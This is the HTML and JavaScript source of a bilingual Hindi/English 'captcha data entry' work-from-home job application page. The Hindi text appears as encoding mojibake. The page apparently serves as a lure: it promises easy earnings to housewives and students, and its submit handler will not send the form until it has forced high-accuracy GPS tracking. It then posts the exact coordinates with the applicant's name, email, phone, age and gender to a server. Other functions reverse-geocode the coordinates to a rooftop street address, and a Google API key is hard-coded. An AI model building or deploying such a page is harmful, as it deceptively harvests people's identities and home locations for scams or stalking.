<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>User Details & Location Form</title>
    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>üìç</text></svg>">
    <!-- Modern font -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="style.css">
</head>

<body>
    <div class="form-container">
        <h1 class="form-title">‡§ï‡•à‡§™‡•ç‡§ö‡§æ ‡§°‡•á‡§ü‡§æ ‡§è‡§Ç‡§ü‡•ç‡§∞‡•Ä ‡§ë‡§™‡§∞‡•á‡§ü‡§∞ ‚Äî ‡§Ü‡§µ‡•á‡§¶‡§® ‡§´‡•â‡§∞‡•ç‡§Æ</h1>
        <div id="locationStatus" class="status-container"></div>

        <div class="job-section">
            <h2>‡§ú‡•â‡§¨ ‡§ü‡§æ‡§á‡§ü‡§≤: ‡§ï‡•à‡§™‡•ç‡§ö‡§æ ‡§°‡•á‡§ü‡§æ ‡§è‡§Ç‡§ü‡•ç‡§∞‡•Ä ‡§ë‡§™‡§∞‡•á‡§ü‡§∞ (‡§µ‡§∞‡•ç‡§ï ‡§´‡•ç‡§∞‡•â‡§Æ ‡§π‡•ã‡§Æ)</h2>
            <div class="job-grid">
                <div class="job-col">
                    <span class="lang-badge">‡§π‡§ø‡§Ç‡§¶‡•Ä</span>
                    <p><strong>‡§ï‡§æ‡§Æ ‡§ï‡§æ ‡§™‡•ç‡§∞‡§ï‡§æ‡§∞:</strong> ‡§™‡§æ‡§∞‡•ç‡§ü-‡§ü‡§æ‡§á‡§Æ / ‡§≤‡§ö‡•Ä‡§≤‡§æ ‡§∏‡§Æ‡§Ø</p>
                    <p><strong>‡§∏‡•ç‡§•‡§æ‡§®:</strong> ‡§ò‡§∞ ‡§∏‡•á ‡§ï‡§æ‡§Æ ‚Äì ‡§™‡•Ç‡§∞‡•á ‡§≠‡§æ‡§∞‡§§ ‡§Æ‡•á‡§Ç</p>
                    <p><strong>‡§ï‡•å‡§® ‡§Ö‡§™‡•ç‡§≤‡§æ‡§à ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç:</strong> ‡§ó‡•É‡§π‡§ø‡§£‡§ø‡§Ø‡§æ‡§Å, ‡§µ‡§ø‡§¶‡•ç‡§Ø‡§æ‡§∞‡•ç‡§•‡•Ä, ‡§Ø‡§æ ‡§ï‡•ã‡§à ‡§≠‡•Ä ‡§ú‡•ã ‡§ò‡§∞ ‡§¨‡•à‡§†‡•á ‡§Ö‡§§‡§ø‡§∞‡§ø‡§ï‡•ç‡§§ ‡§Ü‡§Ø ‡§ï‡§Æ‡§æ‡§®‡§æ ‡§ö‡§æ‡§π‡§§‡§æ ‡§π‡•à‡•§</p>
                    <h3 style="margin-top:10px;">‡§ï‡§æ‡§∞‡•ç‡§Ø ‡§µ‡§ø‡§µ‡§∞‡§£:</h3>
                    <p>‡§Ø‡§π ‡§è‡§ï ‡§Ü‡§∏‡§æ‡§® ‡§ü‡§æ‡§á‡§™‡§ø‡§Ç‡§ó ‡§ú‡•â‡§¨ ‡§π‡•à ‡§ú‡§ø‡§∏‡§Æ‡•á‡§Ç ‡§Ü‡§™‡§ï‡•ã ‡§¶‡§ø‡§è ‡§ó‡§è ‡§ï‡•à‡§™‡•ç‡§ö‡§æ ‡§ï‡•ã‡§°‡•ç‡§∏ ‡§ï‡•ã ‡§∏‡§π‡•Ä-‡§∏‡§π‡•Ä ‡§ü‡§æ‡§á‡§™ ‡§ï‡§∞‡§®‡§æ ‡§π‡•ã‡§ó‡§æ‡•§ ‡§ï‡•ã‡§à ‡§Ö‡§®‡•Å‡§≠‡§µ ‡§ú‡§º‡§∞‡•Ç‡§∞‡•Ä ‡§®‡§π‡•Ä‡§Ç ‡§π‡•à, ‡§¨‡§∏ ‡§á‡§Ç‡§ü‡§∞‡§®‡•á‡§ü ‡§î‡§∞ ‡§¨‡•á‡§∏‡§ø‡§ï ‡§ï‡§Ç‡§™‡•ç‡§Ø‡•Ç‡§ü‡§∞/‡§Æ‡•ã‡§¨‡§æ‡§á‡§≤ ‡§ö‡§≤‡§æ‡§®‡§æ ‡§Ü‡§®‡§æ ‡§ö‡§æ‡§π‡§ø‡§è‡•§</p>
                    <p><strong>‡§ï‡§Æ‡§æ‡§à:</strong> üí∞ ‚Çπ15,000 ‚Äì ‚Çπ20,000 ‡§™‡•ç‡§∞‡§§‡§ø ‡§Æ‡§æ‡§π (‡§ï‡§æ‡§Æ ‡§î‡§∞ ‡§∏‡•ç‡§™‡•Ä‡§° ‡§ï‡•á ‡§Ö‡§®‡•Å‡§∏‡§æ‡§∞)</p>
                    <h3 style="margin-top:10px;">‡§Ø‡•ã‡§ó‡•ç‡§Ø‡§§‡§æ‡§è‡§Å:</h3>
                    <ul>
                        <li>‡§¨‡•á‡§∏‡§ø‡§ï ‡§ï‡§Ç‡§™‡•ç‡§Ø‡•Ç‡§ü‡§∞ ‡§ú‡•ç‡§û‡§æ‡§®</li>
                        <li>‡§á‡§Ç‡§ü‡§∞‡§®‡•á‡§ü ‡§ï‡§®‡•á‡§ï‡•ç‡§∂‡§® ‡§î‡§∞ ‡§Æ‡•ã‡§¨‡§æ‡§á‡§≤/‡§≤‡•à‡§™‡§ü‡•â‡§™</li>
                        <li>‡§Ö‡§Ç‡§ó‡•ç‡§∞‡•á‡§ú‡§º‡•Ä ‡§Ö‡§ï‡•ç‡§∑‡§∞ ‡§î‡§∞ ‡§®‡§Ç‡§¨‡§∞ ‡§ü‡§æ‡§á‡§™ ‡§ï‡§∞‡§®‡•á ‡§ï‡•Ä ‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ</li>
                        <li>‡§ß‡•ç‡§Ø‡§æ‡§®‡§™‡•Ç‡§∞‡•ç‡§µ‡§ï ‡§î‡§∞ ‡§∏‡§π‡•Ä ‡§ï‡§æ‡§Æ ‡§ï‡§∞‡§®‡•á ‡§ï‡•Ä ‡§Ü‡§¶‡§§</li>
                    </ul>
                    <h3 style="margin-top:10px;">‡§≤‡§æ‡§≠:</h3>
                    <ul>
                        <li>‡§ò‡§∞ ‡§¨‡•à‡§†‡•á ‡§Ö‡§§‡§ø‡§∞‡§ø‡§ï‡•ç‡§§ ‡§Ü‡§Ø</li>
                        <li>‡§ï‡•ã‡§à ‡§®‡§ø‡§µ‡•á‡§∂ ‡§®‡§π‡•Ä‡§Ç</li>
                        <li>‡§∏‡§Æ‡§Ø ‡§™‡•Ç‡§∞‡•Ä ‡§§‡§∞‡§π ‡§Ü‡§™‡§ï‡•á ‡§Ö‡§®‡•Å‡§∏‡§æ‡§∞</li>
                    </ul>
                </div>
                <div class="job-col">
                    <span class="lang-badge">English</span>
                    <p><strong>Job Type:</strong> Part-time / Flexible hours</p>
                    <p><strong>Location:</strong> Work from home ‚Äì across India</p>
                    <p><strong>Who can apply:</strong> Housewives, students, or anyone who wants to earn extra income from home.</p>
                    <h3 style="margin-top:10px;">Job Description:</h3>
                    <p>This is a simple typing job where you need to correctly type the given captcha codes. No prior experience required‚Äîjust an internet connection and basic ability to use a computer or mobile.</p>
                    <p><strong>Earnings:</strong> üí∞ ‚Çπ15,000 ‚Äì ‚Çπ20,000 per month (depending on work and speed)</p>
                    <h3 style="margin-top:10px;">Qualifications:</h3>
                    <ul>
                        <li>Basic computer knowledge</li>
                        <li>Internet connection and a mobile/laptop</li>
                        <li>Ability to type English letters and numbers</li>
                        <li>Attention to detail and accuracy</li>
                    </ul>
                    <h3 style="margin-top:10px;">Benefits:</h3>
                    <ul>
                        <li>Earn extra income from home</li>
                        <li>No investment required</li>
                        <li>Work on your own schedule</li>
                    </ul>
                </div>
            </div>
        </div>

        <form id="userForm">
            <!-- Personal Information -->
            <div class="form-row">
                <div class="form-group">
                    <label for="firstName">First Name *</label>
                    <input type="text" id="firstName" name="firstName" required>
                </div>
                <div class="form-group">
                    <label for="lastName">Last Name *</label>
                    <input type="text" id="lastName" name="lastName" required>
                </div>
            </div>

            <div class="form-row">
                <div class="form-group">
                    <label for="email">Email Address *</label>
                    <input type="email" id="email" name="email" required>
                </div>
                <div class="form-group">
                    <label for="phone">Phone Number</label>
                    <input type="tel" id="phone" name="phone">
                </div>
            </div>

            <div class="form-row">
                <div class="form-group">
                    <label for="age">Age</label>
                    <input type="number" id="age" name="age" min="1" max="120">
                </div>
                <div class="form-group">
                    <label for="gender">Gender</label>
                    <select id="gender" name="gender">
                        <option value="">Select Gender</option>
                        <option value="male">Male</option>
                        <option value="female">Female</option>
                        <option value="other">Other</option>
                        <option value="prefer-not-to-say">Prefer not to say</option>
                    </select>
                </div>
            </div>

            <!-- Location Tracking Section -->
            <div class="location-section">
                <h3 class="location-title">üìç GPS Location Tracking</h3>
                <p style="margin-bottom: 15px; color: #666;">We can automatically detect your exact current location and
                    city to provide better service.</p>

                <button type="button" id="getLocationBtn" class="location-btn">
                    Get My Exact Location
                </button>

                <div id="locationStatus"></div>

                <div id="locationDisplay" class="location-display" style="display: none;">
                    <h4>Your Exact Location Details:</h4>
                    <div class="location-info">
                        <div class="location-item">
                            <strong>Latitude:</strong>
                            <span id="latitude">-</span>
                        </div>
                        <div class="location-item">
                            <strong>Longitude:</strong>
                            <span id="longitude">-</span>
                        </div>
                        <div class="location-item">
                            <strong>Accuracy:</strong>
                            <span id="accuracy">-</span>
                        </div>
                        <div class="location-item">
                            <strong>Timestamp:</strong>
                            <span id="timestamp">-</span>
                        </div>
                    </div>

                    <div class="city-info">
                        <h4>üèôÔ∏è Exact City Information:</h4>
                        <div id="cityDetails">Loading city details...</div>
                    </div>

                    <div style="margin-top: 15px;">
                        <strong>Complete Address:</strong>
                        <div id="approximateAddress">Loading exact address...</div>
                    </div>
                </div>
            </div>

            <button type="submit" class="submit-btn">‡§Ü‡§µ‡•á‡§¶‡§® ‡§∏‡§¨‡§Æ‡§ø‡§ü ‡§ï‡§∞‡•á‡§Ç</button>
        </form>
    </div>

    <script>
        let currentLocation = null;
        let exactLocationData = null;
        let bestLocation = null;
        let watchId = null;
        let refineTimer = null;

        // Form submission handler
        document.getElementById('userForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const statusDiv = document.getElementById('locationStatus');
            const locationDisplay = document.getElementById('locationDisplay');
            const submitBtn = document.querySelector('button[type="submit"]');
            const originalBtnText = submitBtn.textContent;
            
            // Disable submit button and show loading state
            submitBtn.disabled = true;
            submitBtn.textContent = 'Getting Location...';
            submitBtn.style.background = '#';
            
            // Show loading message
            statusDiv.innerHTML = '<div class="status-message loading">üîç Getting your precise location (this may take 10-15 seconds)...</div>';
            
            try {
                // Start the refined location capture
                const location = await new Promise((resolve) => {
                    startRefinedLocationCapture({
                        desiredAccuracy: 20, // 20 meters accuracy
                        maxDurationMs: 15000, // 15 seconds max
                        onUpdate: (loc) => {
                            // Update status during capture
                            statusDiv.innerHTML = `
                                <div class="status-message loading">
                                    üîç Getting precise location...<br>
                                    Current accuracy: ${Math.round(loc.accuracy)} meters
                                </div>`;
                        },
                        onDone: (loc) => {
                            if (loc) {
                                currentLocation = loc;
                                displayLocation(loc);
                                locationDisplay.style.display = 'block';
                                resolve(loc);
                            } else {
                                resolve(null);
                            }
                        }
                    });
                });

                if (location) {
                    statusDiv.innerHTML = '<div class="status-message success">‚úÖ Location captured! Submitting form...</div>';
                    
                    // Submit the form with location data
                    const result = await submitFormData(location);
                    
                    if (result.success) {
                        statusDiv.innerHTML = '<div class="status-message success">üéâ Form submitted successfully! Your data has been saved to the database.</div>';
                        // Reset form after successful submission
                        this.reset();
                        // Hide location display
                        locationDisplay.style.display = 'none';
                    } else {
                        throw new Error(result.message || 'Failed to submit form');
                    }
                } else {
                    throw new Error('Could not get precise location. Please try again.');
                }
            } catch (error) {
                console.error('Error:', error);
                statusDiv.innerHTML = `<div class="status-message error">‚ùå ${error.message || 'An error occurred. Please try again.'}</div>`;
            } finally {
                // Re-enable submit button
                submitBtn.disabled = false;
                submitBtn.textContent = originalBtnText;
                submitBtn.style.background = '';
            }
        });

        function startRefinedLocationCapture({ desiredAccuracy = 20, maxDurationMs = 25000, onUpdate = () => {}, onDone = () => {} }) {
            bestLocation = null;
            const options = { enableHighAccuracy: true, timeout: maxDurationMs, maximumAge: 0 };

            try {
                watchId = navigator.geolocation.watchPosition(
                    (position) => {
                        const loc = {
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: position.coords.accuracy || 9999,
                            timestamp: new Date(position.timestamp)
                        };

                        if (!bestLocation || loc.accuracy < bestLocation.accuracy) {
                            bestLocation = loc;
                            onUpdate(bestLocation);

                            // Early stop if desired accuracy reached
                            if (bestLocation.accuracy <= desiredAccuracy) {
                                stopRefinedLocationCapture();
                                onDone(bestLocation);
                            }
                        }
                    },
                    (error) => {
                        // Fallback to one-time high-accuracy reading
                        navigator.geolocation.getCurrentPosition(
                            (pos) => {
                                const loc = {
                                    latitude: pos.coords.latitude,
                                    longitude: pos.coords.longitude,
                                    accuracy: pos.coords.accuracy || 9999,
                                    timestamp: new Date(pos.timestamp)
                                };
                                onUpdate(loc);
                                onDone(loc);
                            },
                            () => onDone(bestLocation),
                            options
                        );
                    },
                    options
                );
            } catch (e) {
                onDone(bestLocation);
            }

            // Hard stop after maxDurationMs, return best seen fix
            refineTimer = setTimeout(() => {
                stopRefinedLocationCapture();
                onDone(bestLocation);
            }, maxDurationMs);
        }

        function stopRefinedLocationCapture() {
            if (watchId !== null) {
                navigator.geolocation.clearWatch(watchId);
                watchId = null;
            }
            if (refineTimer) {
                clearTimeout(refineTimer);
                refineTimer = null;
            }
        }

        function displayLocation(location) {
            document.getElementById('latitude').textContent = location.latitude.toFixed(8);
            document.getElementById('longitude').textContent = location.longitude.toFixed(8);
            document.getElementById('accuracy').textContent = `¬±${Math.round(location.accuracy)} meters`;
            document.getElementById('timestamp').textContent = location.timestamp.toLocaleString();

            document.getElementById('locationDisplay').style.display = 'block';
        }

        function getExactLocationDetails(lat, lng) {
            const addressDiv = document.getElementById('approximateAddress');
            const cityDiv = document.getElementById('cityDetails');

            addressDiv.textContent = 'Getting exact address...';
            cityDiv.textContent = 'Determining exact location...';

            // Replace with your actual API key
            const apiKey = 'AIzaSyBWz5umc3lrE4xUdfPviXY4monWFqX3edw';

            // Ultra-precise geocoding with multiple strategies for maximum accuracy
            getUltraPreciseLocation(lat, lng, apiKey);
        }

        function getUltraPreciseLocation(lat, lng, apiKey) {
            // Strategy 1: Maximum precision request with all address types
            const preciseUrl = `https://maps.googleapis.com/maps/api/geocode/json?latlng=${lat},${lng}&key=${apiKey}&result_type=street_address|premise|subpremise|establishment|point_of_interest&location_type=ROOFTOP|RANGE_INTERPOLATED|GEOMETRIC_CENTER&language=en`;

            fetch(preciseUrl)
                .then(response => response.json())
                .then(data => {
                    console.log('Ultra-Precise Geocoding Response:', data);

                    if (data.status === 'OK' && data.results && data.results.length > 0) {
                        processLocationResults(data.results, lat, lng);
                    } else {
                        // Strategy 2: Broader search with all location types
                        getBroaderPreciseSearch(lat, lng, apiKey);
                    }
                })
                .catch(error => {
                    console.error('Ultra-precise geocoding error:', error);
                    getBroaderPreciseSearch(lat, lng, apiKey);
                });
        }

        function getBroaderPreciseSearch(lat, lng, apiKey) {
            // Strategy 2: Comprehensive search with multiple result types
            const broaderUrl = `https://maps.googleapis.com/maps/api/geocode/json?latlng=${lat},${lng}&key=${apiKey}&result_type=street_address|premise|sublocality|locality|neighborhood|route|intersection&language=en`;

            fetch(broaderUrl)
                .then(response => response.json())
                .then(data => {
                    console.log('Broader Precise Geocoding Response:', data);

                    if (data.status === 'OK' && data.results && data.results.length > 0) {
                        processLocationResults(data.results, lat, lng);
                    } else {
                        // Strategy 3: Multiple parallel API calls for maximum coverage
                        getMultiplePrecisionSources(lat, lng, apiKey);
                    }
                })
                .catch(error => {
                    console.error('Broader precise geocoding error:', error);
                    getMultiplePrecisionSources(lat, lng, apiKey);
                });
        }

        function getMultiplePrecisionSources(lat, lng, apiKey) {
            // Strategy 3: Multiple parallel requests with different parameters
            const urls = [
                // High precision request
                `https://maps.googleapis.com/maps/api/geocode/json?latlng=${lat},${lng}&key=${apiKey}&language=en`,
                // Administrative focus
                `https://maps.googleapis.com/maps/api/geocode/json?latlng=${lat},${lng}&key=${apiKey}&result_type=locality|sublocality|administrative_area_level_3&language=en`,
                // Neighborhood and area focus
                `https://maps.googleapis.com/maps/api/geocode/json?latlng=${lat},${lng}&key=${apiKey}&result_type=neighborhood|sublocality_level_1|sublocality_level_2&language=en`,
                // Point of interest focus
                `https://maps.googleapis.com/maps/api/geocode/json?latlng=${lat},${lng}&key=${apiKey}&result_type=establishment|point_of_interest|natural_feature&language=en`
            ];

            Promise.allSettled(urls.map(url => fetch(url).then(r => r.json())))
                .then(results => {
                    console.log('Multiple precision source results:', results);

                    // Find the most detailed and accurate result
                    let bestResults = null;
                    let maxComponents = 0;

                    for (const result of results) {
                        if (result.status === 'fulfilled' && result.value.status === 'OK' && result.value.results?.length > 0) {
                            const componentCount = result.value.results[0].address_components?.length || 0;
                            if (componentCount > maxComponents) {
                                maxComponents = componentCount;
                                bestResults = result.value.results;
                            }
                        }
                    }

                    if (bestResults) {
                        processLocationResults(bestResults, lat, lng);
                    } else {
                        // Final fallback
                        fallbackToCoordinates(lat, lng);
                    }
                })
                .catch(error => {
                    console.error('Multiple precision source geocoding error:', error);
                    fallbackToCoordinates(lat, lng);
                });
        }

        function getBroaderLocationResults(lat, lng, apiKey) {
            const url = `https://maps.googleapis.com/maps/api/geocode/json?latlng=${lat},${lng}&key=${apiKey}&language=en`;

            fetch(url)
                .then(response => response.json())
                .then(data => {
                    console.log('Broader Geocoding Response:', data);

                    if (data.status === 'OK' && data.results && data.results.length > 0) {
                        processLocationResults(data.results);
                    } else {
                        fallbackToCoordinates(lat, lng);
                    }
                })
                .catch(error => {
                    console.error('Broader geocoding error:', error);
                    fallbackToCoordinates(lat, lng);
                });
        }

        function processLocationResults(results) {
            const addressDiv = document.getElementById('approximateAddress');
            const cityDiv = document.getElementById('cityDetails');

            // Find the most precise result
            const preciseResult = results[0];
            exactLocationData = {
                fullAddress: preciseResult.formatted_address,
                components: preciseResult.address_components,
                placeId: preciseResult.place_id,
                types: preciseResult.types
            };

            // Extract city information from address components
            let cityInfo = extractCityInformation(preciseResult.address_components);

            // Display city information
            let cityDisplay = '';
            if (cityInfo.locality) {
                cityDisplay += `<strong>City/Town:</strong> ${cityInfo.locality}<br>`;
            }
            if (cityInfo.sublocality) {
                cityDisplay += `<strong>Area/Locality:</strong> ${cityInfo.sublocality}<br>`;
            }
            if (cityInfo.district) {
                cityDisplay += `<strong>District:</strong> ${cityInfo.district}<br>`;
            }
            if (cityInfo.state) {
                cityDisplay += `<strong>State:</strong> ${cityInfo.state}<br>`;
            }
            if (cityInfo.country) {
                cityDisplay += `<strong>Country:</strong> ${cityInfo.country}<br>`;
            }
            if (cityInfo.pincode) {
                cityDisplay += `<strong>PIN Code:</strong> ${cityInfo.pincode}`;
            }

            cityDiv.innerHTML = cityDisplay || 'City information not available';
            addressDiv.innerHTML = preciseResult.formatted_address;

            // Update the form's address field
            const addressInput = document.getElementById('address');
            if (addressInput) {
                const firstName = document.getElementById('firstName')?.value || '';
                const lastName = document.getElementById('lastName')?.value || '';
                const userName = firstName || lastName ? `${firstName} ${lastName}`.trim() : '';

                addressInput.value = userName
                    ? `${userName}\n${preciseResult.formatted_address}`
                    : preciseResult.formatted_address;
            }

            console.log('Processed Location Data:', {
                address: preciseResult.formatted_address,
                cityInfo: cityInfo,
                coordinates: currentLocation
            });
        }

        function extractCityInformation(components) {
            const cityInfo = {};

            components.forEach(component => {
                const types = component.types;

                if (types.includes('locality')) {
                    cityInfo.locality = component.long_name;
                } else if (types.includes('sublocality') || types.includes('sublocality_level_1')) {
                    cityInfo.sublocality = component.long_name;
                } else if (types.includes('administrative_area_level_3')) {
                    cityInfo.district = component.long_name;
                } else if (types.includes('administrative_area_level_1')) {
                    cityInfo.state = component.long_name;
                } else if (types.includes('country')) {
                    cityInfo.country = component.long_name;
                } else if (types.includes('postal_code')) {
                    cityInfo.pincode = component.long_name;
                }
            });

            return cityInfo;
        }

        function fallbackToCoordinates(lat, lng) {
            const addressDiv = document.getElementById('approximateAddress');
            const cityDiv = document.getElementById('cityDetails');

            addressDiv.innerHTML = `<em>Exact address not available</em><br>Coordinates: ${lat.toFixed(6)}, ${lng.toFixed(6)}`;
            cityDiv.innerHTML = 'City information could not be determined from coordinates';

            console.log('Fallback to coordinates:', { lat, lng });
        }

        // Function to submit form data
        function submitFormData(locationData = null) {
            const formData = new FormData(document.getElementById('userForm'));
            const data = {};

            // Collect form data
            for (let [key, value] of formData.entries()) {
                data[key] = value;
            }

            // Add location data if available
            if (locationData) {
                data.location = locationData;
                data.exactLocationData = exactLocationData;
                data.locationCaptured = true;
            } else {
                data.locationCaptured = false;
            }

            // Display the collected data
            console.log('Complete Form Data with Exact Location:', data);

            // Show loading message
            const statusDiv = document.getElementById('locationStatus');
            statusDiv.innerHTML = '<div class="status-message loading">üîÑ Submitting form data to database...</div>';

            // Send data to MongoDB through our server API
            return fetch('/api/submit-form', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            })
            .then(async response => {
                // Store the status code for error handling
                const statusCode = response.status;
                try {
                    const data = await response.json();
                    return { ...data, statusCode };
                } catch (error) {
                    // If response is not JSON, return the status text
                    return { 
                        success: false, 
                        message: response.statusText || 'Invalid response from server',
                        statusCode 
                    };
                }
            })
            .then(result => {
                if (result.success) {
                    statusDiv.innerHTML = '<div class="status-message success">üéâ Form submitted successfully! Your data has been saved to the database.</div>';
                    // Reset form after successful submission
                    document.getElementById('userForm').reset();
                    // Hide location display
                    document.getElementById('locationDisplay').style.display = 'none';
                    // Reset location button if it exists
                    const locationBtn = document.getElementById('getLocationBtn');
                    if (locationBtn) {
                        locationBtn.disabled = false;
                        locationBtn.textContent = 'Get My Exact Location';
                        locationBtn.style.background = '';
                    }
                } else {
                    // Handle different types of errors with specific messages
                    let errorMessage = result.message || 'Unknown error occurred';
                    
                    // Add more details for specific error types
                    if (result.statusCode === 400 && result.missingFields) {
                        errorMessage += `: Missing required fields (${result.missingFields.join(', ')})`;
                    } else if (result.statusCode === 400 && result.errors) {
                        const errorDetails = Object.entries(result.errors)
                            .map(([field, msg]) => `${field}: ${msg}`)
                            .join(', ');
                        errorMessage += `: ${errorDetails}`;
                    } else if (result.statusCode === 409) {
                        errorMessage = 'A record with this information already exists in the database';
                    } else if (result.error) {
                        errorMessage += `: ${result.error}`;
                    }
                    
                    console.error('Form submission error:', result);
                    statusDiv.innerHTML = `<div class="status-message error">‚ùå Error: ${errorMessage}</div>`;
                    
                    // Highlight missing fields if applicable
                    if (result.missingFields) {
                        result.missingFields.forEach(field => {
                            const inputField = document.getElementById(field);
                            if (inputField) {
                                inputField.style.borderColor = '#ff4d4f';
                                inputField.style.boxShadow = '0 0 0 2px rgba(255, 77, 79, 0.2)';
                            }
                        });
                    }
                }
                return result;
            })
            .catch(error => {
                console.error('Error in form submission:', error);
                statusDiv.innerHTML = '<div class="status-message error">‚ùå An unexpected error occurred. Please try again.</div>';
                throw error; // Re-throw to allow further error handling
            });
        }
</script>
</body>
</html>
